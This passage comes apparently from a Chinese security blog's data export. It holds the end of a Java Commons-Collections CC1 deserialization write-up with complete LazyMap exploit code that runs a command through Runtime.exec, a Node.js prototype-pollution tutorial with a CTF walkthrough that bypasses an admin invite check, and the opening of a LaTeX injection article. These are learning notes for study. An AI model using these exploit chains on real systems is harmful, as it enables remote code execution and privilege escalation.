alt=\"img\"></p>\n<p>最后再附上详细的利用链：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">ObjectInputStream.readObject()</span><br><span class=\"line\">    AnnotationInvocationHandler.readObject()</span><br><span class=\"line\">         TransformedMap.decorate()</span><br><span class=\"line\">                Map(Proxy).entrySet()</span><br><span class=\"line\">                MapEntry.setValue()</span><br><span class=\"line\">                    TransformedMap.checkSetValue()</span><br><span class=\"line\">                        ChainedTransformer.transform()</span><br><span class=\"line\">                            ConstantTransformer.transform()</span><br><span class=\"line\">                            InvokerTransformer.transform()</span><br><span class=\"line\">                                Method.invoke()</span><br><span class=\"line\">                                    Class.getMethod()</span><br><span class=\"line\">                            InvokerTransformer.transform()</span><br><span class=\"line\">                                Method.invoke()</span><br><span class=\"line\">                                    Runtime.getRuntime()</span><br><span class=\"line\">                            InvokerTransformer.transform()</span><br><span class=\"line\">                                Method.invoke()</span><br><span class=\"line\">                                    Runtime.exec()</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"4-2-LazyMap-链\"><a href=\"#4-2-LazyMap-链\" class=\"headerlink\" title=\"4.2 LazyMap 链\"></a>4.2 LazyMap 链</h2><p>在 ysoserial 中 CC1 的 payload 使用的正是 LazyMap 链，根据作者给出的利用链我们可以发现和上面的 TransformedMap 链的不同之处就是在 TransformedMap 处。</p>\n<p><img src=\"/2023/11/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-CC1-%E9%93%BE%E4%BB%8E0%E5%88%B01%EF%BC%88%E6%89%8B%E6%92%95EXP%EF%BC%89/1699218753130-40.png\" alt=\"img\"></p>\n<h3 id=\"4-2-1-LazyMap-类\"><a href=\"#4-2-1-LazyMap-类\" class=\"headerlink\" title=\"4.2.1 LazyMap 类\"></a>4.2.1 LazyMap 类</h3><p>我们直接进去 LazyMap 类看一下。</p>\n<p><img src=\"/2023/11/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-CC1-%E9%93%BE%E4%BB%8E0%E5%88%B01%EF%BC%88%E6%89%8B%E6%92%95EXP%EF%BC%89/1699218753131-41.png\" alt=\"img\"></p>\n<p>可以看到该类是在 get 方法中调用了 transform 方法，而在 AnnotationInvocationHandler 类的 invoke 方法中正好也是 memberValues 调用了 get 方法。</p>\n<p><img src=\"/2023/11/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-CC1-%E9%93%BE%E4%BB%8E0%E5%88%B01%EF%BC%88%E6%89%8B%E6%92%95EXP%EF%BC%89/1699218753131-42.png\" alt=\"img\"></p>\n<p>到这里之后就和 TransformedMap 链差不多了，根据前面动态代理的知识，我们知道 invoke 方法是 java.lang.reflect.InvocationHandler 接口中的一个方法，还需要一个动态代理才能调用。前面也说过，动态代理只能代理接口，而无法代理类，而我们的 LazyMap 正好是继承于 Map 接口，所以我们直接创建一个创建一个 Map 代理对象，此类的 decorate 方法只需要接收两个参数，而且也不需要 hashedMap.put(“value”,”1”); 这个操作了。</p>\n<p>所以我们根据分析结果修改一下我们 TransformedMap 链的代码。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.io.*;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.annotation.Target;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Constructor;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.InvocationHandler;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Proxy;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Map;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.Transformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.map.HashedMap;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">CC1LazyMap</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Serializable</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        Transformer[] transformers = <span class=\"keyword\">new</span> <span class=\"title class_\">Transformer</span>[]&#123;</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">ConstantTransformer</span>(Runtime.class),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">InvokerTransformer</span>(<span class=\"string\">&quot;getMethod&quot;</span>,<span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[]&#123;String.class, Class[].class&#125;,<span class=\"keyword\">new</span> <span class=\"title class_\">String</span>[]&#123;<span class=\"string\">&quot;getRuntime&quot;</span>, <span class=\"literal\">null</span>&#125;),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">InvokerTransformer</span>(<span class=\"string\">&quot;invoke&quot;</span>, <span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>[]&#123;<span class=\"literal\">null</span>, <span class=\"literal\">null</span>&#125;),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">InvokerTransformer</span>(<span class=\"string\">&quot;exec&quot;</span>,<span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[]&#123;String.class&#125;,<span class=\"keyword\">new</span> <span class=\"title class_\">String</span>[]&#123;<span class=\"string\">&quot;calc&quot;</span>&#125;),</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">ChainedTransformer</span> <span class=\"variable\">chainedtransformer</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ChainedTransformer</span>(transformers);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">HashedMap</span> <span class=\"variable\">hashedMap</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">HashedMap</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">        Map&lt;Object,Object&gt; decorate = LazyMap.decorate(hashedMap,chainedtransformer);</span><br><span class=\"line\"></span><br><span class=\"line\">        Class&lt;?&gt; Clazz = Class.forName(<span class=\"string\">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class=\"line\">        Constructor&lt;?&gt; declaredConstructor = Clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class=\"line\">        declaredConstructor.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">        <span class=\"type\">Object</span> <span class=\"variable\">o1</span> <span class=\"operator\">=</span> declaredConstructor.newInstance(Target.class,decorate);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">Map</span> <span class=\"variable\">mapProxy</span> <span class=\"operator\">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), <span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[]&#123;Map.class&#125;, (InvocationHandler) o1);</span><br><span class=\"line\">        Object o2= declaredConstructor.newInstance(Target.class,mapProxy);</span><br><span class=\"line\"></span><br><span class=\"line\">        serialize(o2);</span><br><span class=\"line\">        System.out.println(unserialize(<span class=\"string\">&quot;payload.ser&quot;</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//序列化</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">serialize</span><span class=\"params\">(Object obj)</span> <span class=\"keyword\">throws</span> IOException &#123;</span><br><span class=\"line\">        <span class=\"type\">ObjectOutputStream</span> <span class=\"variable\">oos</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectOutputStream</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">FileOutputStream</span>(<span class=\"string\">&quot;payload.ser&quot;</span>));</span><br><span class=\"line\">        oos.writeObject(obj);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//反序列化</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Object <span class=\"title function_\">unserialize</span><span class=\"params\">(String Filename)</span> <span class=\"keyword\">throws</span> IOException,ClassNotFoundException&#123;</span><br><span class=\"line\">        <span class=\"type\">ObjectInputStream</span> <span class=\"variable\">ois</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectInputStream</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">FileInputStream</span>(Filename));</span><br><span class=\"line\">        <span class=\"type\">Object</span> <span class=\"variable\">obj</span> <span class=\"operator\">=</span> ois.readObject();</span><br><span class=\"line\">        <span class=\"keyword\">return</span> obj;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2023/11/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-CC1-%E9%93%BE%E4%BB%8E0%E5%88%B01%EF%BC%88%E6%89%8B%E6%92%95EXP%EF%BC%89/1699218753131-43.png\" alt=\"img\"></p>\n<p>成功弹计算器。</p>\n<p>对比发现，TransformedMap链需要设定hashMap键值对的特定值，而LazyMap在后面需要用到动态代理的知识。</p>\n<h1 id=\"0x05-总结\"><a href=\"#0x05-总结\" class=\"headerlink\" title=\"0x05 总结\"></a>0x05 总结</h1><p>断断续续分析了好几天才完成了这篇文章，由于对 Java 代码的不熟悉导致分析起来遇到了许多大大小小的问题，而且经常分析到一半就忘记了前面的步骤，到底还是基础不牢地动山摇，继续沉淀吧。</p>\n","categories":["WEB安全"],"tags":["Java反序列化"]},{"title":"Nodejs原型链污染","url":"/2023/11/06/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/","content":"<p>声明：本篇文章作者YDJA，本文属i春秋原创奖励计划，未经许可禁止转载。</p>\n<h1 id=\"0x00-前言\"><a href=\"#0x00-前言\" class=\"headerlink\" title=\"0x00 前言\"></a>0x00 前言</h1><p>近期的 CTF 中 Nodejs 原型链污染频频出现，写篇文章记录一下入门的学习过程</p>\n<span id=\"more\"></span>\n\n<h1 id=\"0x01-基础知识\"><a href=\"#0x01-基础知识\" class=\"headerlink\" title=\"0x01 基础知识\"></a>0x01 基础知识</h1><h3 id=\"1-1-js-对象\"><a href=\"#1-1-js-对象\" class=\"headerlink\" title=\"1.1 js 对象\"></a>1.1 js 对象</h3><ul>\n<li>键值对的集合，键有称为对象的属性名，值又称为对象的属性值</li>\n</ul>\n<p><img src=\"/2023/11/06/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/1699218403992-18.png\" alt=\"img\"></p>\n<h3 id=\"1-2-js-类\"><a href=\"#1-2-js-类\" class=\"headerlink\" title=\"1.2 js 类\"></a>1.2 js 类</h3><ul>\n<li>在 js 中，类可以使用“构造函数”的形式来定义，然后通过 new 来实例化为对象</li>\n</ul>\n<p><img src=\"/2023/11/06/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/1699218403989-1.png\" alt=\"img\"></p>\n<h3 id=\"1-3-原型-prototype-和-proto\"><a href=\"#1-3-原型-prototype-和-proto\" class=\"headerlink\" title=\"1.3 原型 prototype 和 proto\"></a>1.3 原型 <strong>prototype 和 <strong>proto</strong></strong></h3><p>在 js 中，原型（prototype）是一种对象，它充当其他对象的模板。每个 js 对象都有一个原型，可以通过 <strong>proto</strong> 属性访问。通过原型对象可以实现属性和方法的共享、动态改变对象的属性和方法等，下面是一个简单的例子：</p>\n<p><img src=\"/2023/11/06/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/1699218403990-2.png\" alt=\"img\"></p>\n<p>在上述代码中，User.prototype 对象被添加了一个 func 方法，实例化的 User 对象（u）会继承 User.prototype 上的 func 方法，使我们在所有实例化的对象中共享同一个方法，避免了重复创建</p>\n<p><img src=\"/2023/11/06/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/1699218403990-3.png\" alt=\"img\"></p>\n<p>从 u 对象的原型中我们也可以看到被定义的 func 函数</p>\n<p>prototype 和 __proto__的用法区别：</p>\n<p><img src=\"/2023/11/06/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/1699218403990-4.png\" alt=\"img\"></p>\n<p>也就是说，一个类实例化出来的对象，可以通过 <strong>proto</strong> 属性来访问该类的原型（prototype）</p>\n<h3 id=\"1-4-原型链继承\"><a href=\"#1-4-原型链继承\" class=\"headerlink\" title=\"1.4 原型链继承\"></a>1.4 原型链继承</h3><p>承接 1.3 的内容，对象 u 在调用 func 函数的时候，实际上 js 引擎会进行如下操作:</p>\n<p>在对象 u 中寻找 func —&gt; 如果找不到，则在 u.__proto__中寻找 fun —&gt; 如果仍然找不到，则继续在u.<strong>proto</strong>.__proto__中寻找func —&gt; 依次寻找，直到找到null结束（Object 类的原型 Object.prototype 的 <strong>proto</strong> 就是null）</p>\n<p><img src=\"/2023/11/06/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/1699218403990-5.png\" alt=\"img\"></p>\n<p>这就是原型链的继承</p>\n<h1 id=\"0x02-攻击方式\"><a href=\"#0x02-攻击方式\" class=\"headerlink\" title=\"0x02 攻击方式\"></a>0x02 攻击方式</h1><h3 id=\"2-1-漏洞原理\"><a href=\"#2-1-漏洞原理\" class=\"headerlink\" title=\"2.1 漏洞原理\"></a>2.1 漏洞原理</h3><p>先来做一个演示：</p>\n<p><img src=\"/2023/11/06/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/1699218403990-6.png\" alt=\"img\"></p>\n<p>结合我们前面提到的基础知识，我们很容易理解这个过程。先是创建一个 User1 对象（本质是 Object 类的实例化对象），对象中有 name 属性和对应值，然后我们尝试修改 User1 的原型 User1.<strong>proto</strong> （本质是 Object 类），给它增加一个 name 属性，值为 admin，然后我们访问 User1 中的 name 属性，根据原型链的继承原创，User1 首先在自身寻找 name 属性，所以值还是 ydj。而当我们再创建一个不含 name 属性的 User2 对象时，访问该对象的 name 属性，虽然 User2 本身没有，但是它继承了原型（Object类）的属性，所以最终得到 User2.name 的值为 admin，这就是原型链污染攻击</p>\n<p><img src=\"/2023/11/06/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/1699218403990-7.png\" alt=\"img\"></p>\n<h3 id=\"2-2-触发条件\"><a href=\"#2-2-触发条件\" class=\"headerlink\" title=\"2.2 触发条件\"></a>2.2 触发条件</h3><p>原型链污染需要我们修改 <strong>proto</strong> 的值，所以我们只需要找到能够操作对象的键的行为就可以了，下面举两个常见的例子</p>\n<ul>\n<li>merge</li>\n</ul>\n<p>merge 函数接受一个目标对象和任意数量的源对象。它会将源对象中的键值对递归地合并到目标对象中</p>\n<p>示例代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">merge</span>(<span class=\"params\">target, ...sources</span>) &#123;</span><br><span class=\"line\">  sources.<span class=\"title function_\">forEach</span>(<span class=\"function\"><span class=\"params\">source</span> =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"title class_\">Object</span>.<span class=\"title function_\">keys</span>(source).<span class=\"title function_\">forEach</span>(<span class=\"function\"><span class=\"params\">key</span> =&gt;</span> &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (source[key] <span class=\"keyword\">instanceof</span> <span class=\"title class_\">Object</span> &amp;&amp; key <span class=\"keyword\">in</span> target) &#123;</span><br><span class=\"line\">        <span class=\"title function_\">merge</span>(target[key], source[key]);</span><br><span class=\"line\">      &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        target[key] = source[key];</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">  &#125;);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> target;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2023/11/06/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/1699218403990-8.png\" alt=\"img\"></p>\n<p>我们之所以关注 merge 函数，是因为在函数的实现过程中出现了赋值操作 target[key] &#x3D; source[key]，如果将 key 换成 <strong>proto</strong> 是不是就可以完成原型链污染了呢，我们不妨直接试一下</p>\n<p><img src=\"/2023/11/06/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/1699218403990-9.png\" alt=\"img\"></p>\n<p>从结果来看，merge 合并成功但是原型链没有污染成功</p>\n<p>实际上，<strong>proto</strong> 在上述代码中已经被认为是 source 对象的原型，所以该操作只能污染 source 对象的原型而不是 Object 类的原型，如下：</p>\n<p><img src=\"/2023/11/06/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/1699218403990-10.png\" alt=\"img\"></p>\n<p>（关于这里的两个 object 原型我没太搞懂，个人感觉前者是 source 的直接原型，后者才是所有 object 类的实例化对象的共同原型，要污染到后者才能达成原型链污染攻击）</p>\n<p>所以这时候我们需要借助 JSON.parse 方法：当使用 JSON.parse 解析 JSON 字符串时，JavaScript 引擎会自动阻止对原型链的修改</p>\n<p><img src=\"/2023/11/06/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/1699218403990-11.png\" alt=\"img\"></p>\n<p>此时 Object 的原型已经成功被污染（这里要注意 json 格式的属性名要加引号，否则会发生如图的报错）</p>\n<p>而我个人的理解是 <strong>proto</strong> 在 source 中是以json字符串的形式存在的，当经过 merge 方法合并到 target 中才会被解释成 target 的原型，从而造成污染</p>\n<p>merge 在很多常见库中都存在，是最常见的能够操作对象中键的操作，所以也最容易出现原型链污染攻击</p>\n<ul>\n<li>clone</li>\n</ul>\n<p>clone 函数接受一个对象，并返回该对象的深拷贝副本</p>\n<p>示例代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">clone</span>(<span class=\"params\">obj</span>) &#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (obj === <span class=\"literal\">null</span> || <span class=\"keyword\">typeof</span> obj !== <span class=\"string\">&#x27;object&#x27;</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> obj;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">let</span> result = <span class=\"title class_\">Array</span>.<span class=\"title function_\">isArray</span>(obj) ? [] : &#123;&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> key <span class=\"keyword\">in</span> obj) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"title class_\">Object</span>.<span class=\"property\"><span class=\"keyword\">prototype</span></span>.<span class=\"property\">hasOwnProperty</span>.<span class=\"title function_\">call</span>(obj, key)) &#123;</span><br><span class=\"line\">      result[key] = <span class=\"title function_\">clone</span>(obj[key]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2023/11/06/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/1699218403990-12.png\" alt=\"img\"></p>\n<p>污染方法和 merge 类似（因为 clone 的底层其实就是将源对象 merge 到一个空对象中）</p>\n<h1 id=\"0x03-CTF-例题\"><a href=\"#0x03-CTF-例题\" class=\"headerlink\" title=\"0x03 CTF 例题\"></a>0x03 CTF 例题</h1><h3 id=\"CATCTF2022-wife-wife\"><a href=\"#CATCTF2022-wife-wife\" class=\"headerlink\" title=\"[CATCTF2022]wife_wife\"></a>[CATCTF2022]wife_wife</h3><p>github 上找到源码进行分析（比赛时是黑盒），重点在 register 路由</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\">app.<span class=\"title function_\">post</span>(<span class=\"string\">&#x27;/register&#x27;</span>, <span class=\"function\">(<span class=\"params\">req, res</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> user = <span class=\"title class_\">JSON</span>.<span class=\"title function_\">parse</span>(req.<span class=\"property\">body</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!user.<span class=\"property\">username</span> || !user.<span class=\"property\">password</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> res.<span class=\"title function_\">json</span>(&#123; <span class=\"attr\">msg</span>: <span class=\"string\">&#x27;empty username or password&#x27;</span>, <span class=\"attr\">err</span>: <span class=\"literal\">true</span> &#125;)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (users.<span class=\"title function_\">filter</span>(<span class=\"function\"><span class=\"params\">u</span> =&gt;</span> u.<span class=\"property\">username</span> == user.<span class=\"property\">username</span>).<span class=\"property\">length</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> res.<span class=\"title function_\">json</span>(&#123; <span class=\"attr\">msg</span>: <span class=\"string\">&#x27;username already exists&#x27;</span>, <span class=\"attr\">err</span>: <span class=\"literal\">true</span> &#125;)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (user.<span class=\"property\">isAdmin</span> &amp;&amp; user.<span class=\"property\">inviteCode</span> != <span class=\"variable constant_\">INVITE_CODE</span>) &#123;</span><br><span class=\"line\">        user.<span class=\"property\">isAdmin</span> = <span class=\"literal\">false</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> res.<span class=\"title function_\">json</span>(&#123; <span class=\"attr\">msg</span>: <span class=\"string\">&#x27;invalid invite code&#x27;</span>, <span class=\"attr\">err</span>: <span class=\"literal\">true</span> &#125;)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> newUser = <span class=\"title class_\">Object</span>.<span class=\"title function_\">assign</span>(&#123;&#125;, baseUser, user)</span><br><span class=\"line\">    users.<span class=\"title function_\">push</span>(newUser)</span><br><span class=\"line\">    res.<span class=\"title function_\">json</span>(&#123; <span class=\"attr\">msg</span>: <span class=\"string\">&#x27;user created successfully&#x27;</span>, <span class=\"attr\">err</span>: <span class=\"literal\">false</span> &#125;)</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n\n<p>我们关注 Object.assign 方法</p>\n<p><img src=\"/2023/11/06/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/1699218403991-13.png\" alt=\"img\"></p>\n<p>类似于上面提到的 merge（题目也自带了 JSON.parse 解析）</p>\n<p>根据抓包信息，我们大致可以判断出 flag 界面需要鉴权（user.isAdmin &#x3D; true），但是我们并不知道邀请码，所以我们可以借助 Object.assign 方法在注册普通用户的同时污染原型链，也就是给解析出来的 user 对象的原型中增加 isAdmin 属性并且值为 true，这样就可以跳过邀请码验证这一步骤</p>\n<p>在控制台做个演示：</p>\n<p><img src=\"/2023/11/06/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/1699218403991-14.png\" alt=\"img\"></p>\n<p>所以只要将原本注册的请求体</p>\n<p><img src=\"/2023/11/06/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/1699218403991-15.png\" alt=\"img\"></p>\n<p>改成我们的 payload 就可以了</p>\n<p><img src=\"/2023/11/06/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/1699218403991-16.png\" alt=\"img\"></p>\n<p>最后正常登录即可看到 flag</p>\n<p><img src=\"/2023/11/06/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/1699218403991-17.png\" alt=\"img\"></p>\n<h1 id=\"0x04-总结\"><a href=\"#0x04-总结\" class=\"headerlink\" title=\"0x04 总结\"></a>0x04 总结</h1><p>本文为学习记录文章，就原型链污染攻击的入门分享了一些个人拙见，技术细节难免有不足或者模糊不清之处，还请师傅们多多指教</p>\n","categories":["CTF","WEB"],"tags":["Nodejs原型链污染"]},{"title":"LaTex注入","url":"/2023/11/06/LaTex%E6%B3%A8%E5%85%A5/","content":"<p>声明：本篇文章作者YDJA，本文属i春秋原创奖励计划，未经许可禁止转载。</p>\n<h1 id=\"0x00-前言\"><a href=\"#0x00-前言\" class=\"headerlink\" title=\"0x00 前言\"></a>0x00 前言</h1><p>在打 HTB-Topology 的时候遇到了 LaTex 注入漏洞，不禁联想起之前打2022中科大 hackgame CTF 时 web 中的 LaTeX 机器人（当时做的时候可谓是一脸懵批），然后发现国内介绍该漏洞的文章好像挺少的，所以我也翻阅了一些文章资料简单研究一下，写了点总结，希望能对师傅们有所帮助，有不足之处还请多多指教</p>\n<span id=\"more\"></span>\n\n<h1 id=\"0x01-漏洞简介\"><a href=\"#0x01-漏洞简介\" class=\"headerlink\" title=\"0x01 漏洞简介\"></a>0x01 漏洞简介</h1><p>先来看一下 oi-wiki 中（<a href=\"https://oi-wiki.org/tools/latex/%EF%BC%89%E5%85%B3%E4%BA%8E\">https://oi-wiki.org/tools/latex/）关于</a> LaTex 的介绍：</p>\n<blockquote>\n<p>LaTeX（读作&#x2F;ˈlɑːtɛx&#x2F;或&#x2F;ˈleɪtɛx&#x2F;）是一个让你的文档看起来更专业的排版系统，而不是文字处理器。它尤其适合处理篇幅较长、结构严谨的文档，并且十分擅长处理公式表达。它是免费的软件，对大多数操作系统都适用。</p>\n<p>LaTeX 基于 TeX（Donald Knuth 在 1978 年为数字化排版设计的排版系统）。TeX 是一种电脑能够处理的低级语言，但大多数人发现它很难使用。LaTeX 正是为了让它变得更加易用而设计的。目前 LaTeX 的版本是 LaTeX 2e。</p>\n<p>如果你习惯于使用微软的 Office Word 处理文档，那么你会觉得 LaTeX 的工作方式让你很不习惯。Word 是典型的「所见即所得」的编辑器，你可以在编排文档的时侯查看到最终的排版效果。但使用 LaTeX 时你并不能方便地查看最终效果，这使得你专注于内容而不是外观的调整。</p>\n<p>一个 LaTeX 文档是一个以 .tex 结尾的文本文件，可以使用任意的文本编辑器编辑，比如 Notepad，但对于大多数人而言，使用一个合适的 LaTeX 编辑器会使得编辑的过程容易很多。在编辑的过程中你可以标记文档的结构。完成后你可以进行编译——这意味着将它转化为另一种格式的文档。它支持多种格式，但最常用的是 PDF 文档格式。</p>\n</blockquote>\n<p>站在一个安全人员的角度我们不难发现 LaTex 存在的问题：高度的自定义和控制，而且还可以像其他编程语言一样在编译后实现读写文件，执行命令等操作，导致了安全隐患</p>\n<p>官方也有考虑到了这一点，通过 texmf.cnf 配置文件控制 latex 的行为</p>\n<figure class=\"highlight latex\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">% Enable system commands via \\write18&#123;...&#125;.  When enabled fully (set to</span></span><br><span class=\"line\"><span class=\"comment\">% t), obviously insecure.  When enabled partially (set to p), only the</span></span><br><span class=\"line\"><span class=\"comment\">% commands listed in shell_escape_commands are allowed.  Although this</span></span><br><span class=\"line\"><span class=\"comment\">% is not fully secure either, it is much better, and so useful that we</span></span><br><span class=\"line\"><span class=\"comment\">% enable it for everything but bare tex.</span></span><br><span class=\"line\">shell<span class=\"built_in\">_</span>escape = p</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">% No spaces in this command list.</span></span><br><span class=\"line\"><span class=\"comment\">%</span></span><br><span class=\"line\"><span class=\"comment\">% The programs listed here are as safe as any we know: they either do</span></span><br><span class=\"line\"><span class=\"comment\">% not write any output files, respect openout_any, or have hard-coded</span></span><br><span class=\"line\"><span class=\"comment\">% restrictions similar or higher to openout_any=p.  They also have no</span></span><br><span class=\"line\"><span class=\"comment\">% features to invoke arbitrary other programs, and no known exploitable</span></span><br><span class=\"line\"><span class=\"comment\">% bugs.  All to the best of our knowledge.  They also have practical use</span></span><br><span class=\"line\"><span class=\"comment\">% for being called from TeX.</span></span><br><span class=\"line\"><span class=\"comment\">%</span></span><br><span class=\"line\">shell<span class=\"built_in\">_</span>escape<span class=\"built_in\">_</span>commands = <span class=\"keyword\">\\</span></span><br><span class=\"line\"><span class=\"keyword\"></span>bibtex,bibtex8,<span class=\"keyword\">\\</span></span><br><span class=\"line\"><span class=\"keyword\"></span>extractbb,<span class=\"keyword\">\\</span></span><br><span class=\"line\"><span class=\"keyword\"></span>kpsewhich,<span 